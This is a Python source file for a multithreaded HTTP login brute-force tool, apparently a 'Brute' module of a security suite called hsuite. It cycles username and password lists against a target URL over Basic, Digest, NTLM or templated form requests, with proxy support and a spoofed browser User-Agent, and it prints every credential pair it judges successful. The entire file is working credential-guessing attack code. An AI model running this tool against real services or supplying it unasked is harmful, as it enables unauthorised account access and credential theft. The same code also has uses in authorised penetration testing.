from __future__ import (absolute_import, division, print_function)
__metaclass__ = type
__requires__ = ['hsuite']

import os
import sys
from string import Template
from random import randint

from hsuite.cli import CLI
from hsuite import context, constants as C
from hsuite.errors import HSuiteOptionsError, HSuiteAssertionError
from hsuite.modules.http import HTTP
from hsuite.utils.display import Display
from hsuite.modules import HTTP, HTTPBasicAuth, HTTPDigestAuth, HttpNtlmAuth, Thread
from hsuite.utils.common.text.converters import json
from hsuite.utils.six.moves.urllib.parse import urlparse
from hsuite.utils.six import PY3


display = Display()


class HTemplate(Template):
    delimiter = '{{'
    pattern = r'''
    \{\{\s?(?:
    (?P<escaped>\{\{)|
    (?P<named>[_a-z][_a-z0-9]*)\s?\}\}|
    (?P<braced>[_a-z][_a-z0-9]*)\s?\}\}|
    (?P<invalid>)
    )
    '''


class BruteCLI(CLI):
    def __init__(self, args):
        super(BruteCLI, self).__init__(args)

        self.user_list = list()
        self.password_list = list()
        self.results = list()

    def init_parser(self):
        super(BruteCLI, self).init_parser(
            usage="%prog [options]", desc="Run Brute")

        user = self.parser.add_mutually_exclusive_group(required=True)
        user.add_argument(
            '-u', '--user', dest='users', default=[], action='append', help="Username(s)")
        user.add_argument(
            '--user-list', dest='user_list', help="File path that has a users names list")

        expected = self.parser.add_mutually_exclusive_group(required=True)
        expected.add_argument(
            '--expected-codes', dest='expected_codes', default=[], type=int, nargs='+', help="Expected code(s) for success login")
        expected.add_argument(
            '--expected-response', dest='expected_response', default=None, help="Expected response contain")
        expected.add_argument(
            '--no-expected-response', dest='no_expected_response', default=None, help="No expected response contain")

        auth_type = self.parser.add_mutually_exclusive_group()
        auth_type.add_argument(
            '--auth-basic', dest='auth_basic', default=False, action='store_true', help="Basic HTTP authentication")
        auth_type.add_argument(
            '--auth-digest', dest='auth_digest', default=False, action='store_true', help="Digest access authentication")
        auth_type.add_argument(
            '--auth-ntlm', dest='auth_ntlm', default=False, action='store_true', help="NTLM authentication")

        self.parser.add_argument(
            '--target', dest='target', required=True, help="URL")
        self.parser.add_argument(
            '-m', '--method', dest='method', type=str.upper, choices=['GET', 'POST'], default='GET', help="Request type")
        self.parser.add_argument(
            '--password-list', dest='password_list', required=True, help="File path that has a passwords list")
        self.parser.add_argument(
            '-H', '--header', dest='headers', default=[], action='append', help="Pass custom header(s)")
        self.parser.add_argument(
            '-t', '--threads', dest='threads', type=int, default=1, help="Number of threads")
        self.parser.add_argument(
            '-p', '--proxy', dest='proxy', default=None, help="Using proxy")
        self.parser.add_argument(
            '-d', '--data', dest='data', default=None, help="HTTP POST data")

    def post_process_args(self, options):
        options = super(BruteCLI, self).post_process_args(options)

        if options.user_list and not os.path.exists(options.user_list):
            raise HSuiteOptionsError(
                "%s is not a valid or accessible file" % options.user_list)

        if options.password_list and not os.path.exists(options.password_list):
            raise HSuiteOptionsError(
                "%s is not a valid or accessible file" % options.password_list)

        if options.target and not urlparse(options.target).netloc:
            raise HSuiteOptionsError(
                "%s is not a valid url" % options.target)

        if options.proxy and not urlparse(options.proxy).netloc:
            raise HSuiteOptionsError(
                "%s is not a valid proxy" % options.proxy)

        if options.method.upper() not in ['GET', 'POST']:
            raise HSuiteOptionsError(
                "%s is not a valid request type" % options.method)

        if options.headers:
            for header in options.headers:
                splited = header.split(':')
                if len(splited) <= 1 or not splited[1].strip():
                    raise HSuiteOptionsError(
                        "\"%s\" is not a valid header" % header)

        display.verbosity = options.verbosity
        return options

    def run(self):
        super(BruteCLI, self).run()
        display.banner("Starting Brute script")

        if context.CLIARGS['user_list']:
            with open(context.CLIARGS['user_list']) as users:
                self.user_list = [user.strip() for user in users]
        else:
            self.user_list = context.CLIARGS['users']

        with open(context.CLIARGS['password_list'], 'r') as passwords:
            self.password_list = [password.strip() for password in passwords]

        passwords = []
        if context.CLIARGS['threads'] > len(self.password_list):
            raise HSuiteAssertionError("Too many threads")
        elif context.CLIARGS['threads'] == len(self.password_list):
            passwords = [[password] for password in self.password_list]
        elif context.CLIARGS['threads'] == 1:
            passwords = [self.password_list]
        else:
            per = len(self.password_list) // context.CLIARGS['threads']
            passwords = [self.password_list[i:i + len(self.password_list) // per]
                         for i in range(0, len(self.password_list), len(self.password_list) // per)]

            if len(passwords) > context.CLIARGS['threads']:
                size = len(passwords) - context.CLIARGS['threads']
                for i in range(context.CLIARGS['threads'], len(passwords)):
                    while passwords[i]:
                        index = randint(0, context.CLIARGS['threads'] - 1)
                        password = randint(0, len(passwords[i]) - 1)
                        passwords[index].append(passwords[i][password])
                        passwords[i].remove(passwords[i][password])

        threads = []
        for password in passwords:
            if password:
                thread = Thread(
                    target=self.brute, args=(self.user_list, password,))
                thread.daemon = True
                threads.append(thread)

        for thread in threads:
            thread.start()

        caught = False

        try:
            for thread in threads:
                thread.wait()
        except KeyboardInterrupt:
            caught = True
            display.warning("Collecting credentials ...")

        if self.results:
            display.display(
                "Total credentials: %d" % len(self.results), C.COLOR_BANNER)

            for credential in self.results:
                display.display(
                    "Success: %s:%s" % (credential['username'], credential['password']), C.COLOR_OK)

        if caught:
            display.warning("User interrupted execution")
            sys.exit(99)

    def brute(self, users, passwords):
        headers = dict()

        headers['User-Agent'] = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        if context.CLIARGS['method'] == 'POST':
            headers['Content-Type'] = 'application/x-www-form-urlencoded'
        if context.CLIARGS['headers']:
            for header in context.CLIARGS['headers']:
                splited = header.split(':')
                key = splited[0].strip()
                value = ''.join(splited[1:]).strip()
                headers[key] = value

        http = HTTP(headers=headers, proxy=context.CLIARGS['proxy'])

        for password in passwords:
            for user in users:
                data = None

                if context.CLIARGS['method'] == 'POST' and context.CLIARGS['data']:
                    template = HTemplate(context.CLIARGS['data'])
                    if headers['Content-Type'] and 'json' in headers['Content-Type'].lower():
                        data = json.dump(
                            template.substitute(Username=user, Password=password))
                    else:
                        data = template.substitute(
                            Username=user, Password=password)

                auth = None
                url = context.CLIARGS['target']

                if context.CLIARGS['auth_basic']:
                    auth = HTTPBasicAuth(user, password)
                elif context.CLIARGS['auth_digest']:
                    auth = HTTPDigestAuth(user, password)
                elif context.CLIARGS['auth_ntlm']:
                    auth = HttpNtlmAuth(user, password)
                else:
                    template = HTemplate(url)
                    url = template.substitute(Username=user, Password=password)

                resp = http.request(
                    context.CLIARGS['method'], url, auth=auth, data=data)

                if context.CLIARGS['expected_codes'] and resp.status_code in context.CLIARGS['expected_codes']:
                    self.results.append(
                        {'username': user, 'password': password})
                    if display.verbosity >= 1:
                        display.display(
                            "Success: %s:%s" % (user, password), C.COLOR_OK)
                elif context.CLIARGS['expected_response'] and context.CLIARGS['expected_response'] in resp.text:
                    self.results.append(
                        {'username': user, 'password': password})
                    if display.verbosity >= 1:
                        display.display(
                            "Success: %s:%s" % (user, password), C.COLOR_OK)
                elif context.CLIARGS['no_expected_response'] and context.CLIARGS['no_expected_response'] not in resp.text:
                    self.results.append(
                        {'username': user, 'password': password})
                    if display.verbosity >= 1:
                        display.display(
                            "Success: %s:%s" % (user, password), C.COLOR_OK)
                else:
                    if display.verbosity >= 1:
                        display.display(
                            "Failed: %s:%s" % (user, password), C.COLOR_ERROR)
